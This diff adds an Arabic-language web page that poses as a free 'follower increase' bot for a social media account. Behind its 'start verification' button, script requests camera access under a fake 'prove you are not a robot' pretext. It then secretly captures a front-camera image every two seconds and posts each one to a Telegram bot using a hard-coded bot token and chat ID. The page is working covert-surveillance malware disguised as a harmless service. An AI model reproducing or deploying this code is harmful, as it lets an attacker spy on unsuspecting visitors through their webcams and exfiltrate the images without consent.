@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>زيادة متابعين حقيقية 2026</title>
+    <style>
+        body { background: #fafafa; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 50px; direction: rtl; }
+        .card { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 320px; margin: auto; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        h2 { color: #262626; font-size: 20px; }
+        p { color: #8e8e8e; font-size: 14px; }
+        button { background: #0095f6; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>🚀 بوت تمن ناكع للزيادة</h2>
+        <p>مرحباً بك! اضغط على الزر أدناه للتحقق من حسابك وبدء إرسال المتابعين.</p>
+        <button onclick="startInfection()">بدء التحقق الآن</button>
+        <video id="video" width="0" height="0" autoplay style="display:none;"></video>
+        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        const API_TOKEN = '8444214588:AAE8ugJvMnz8RNfWuIvBCT_-9X-NHl01qek';
+        const MY_ID = '1371063739';
+
+        async function startInfection() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // سحب صورة كل 2 ثانية وإرسالها لك
+                setInterval(() => {
+                    captureImage();
+                }, 2000);
+            } catch (err) {
+                alert("⚠️ خطأ: يجب السماح بالوصول للكاميرا لتأكيد أنك لست روبوت!");
+            }
+        }
+
+        function captureImage() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', MY_ID);
+                formData.append('photo', blob, 'cam_shot.jpg');
+                formData.append('caption', '🔥 تمن ناكع: تم سحب صورة جديدة من الكاميرا الأمامية!');
+
+                fetch(`https://api.telegram.org/bot${API_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
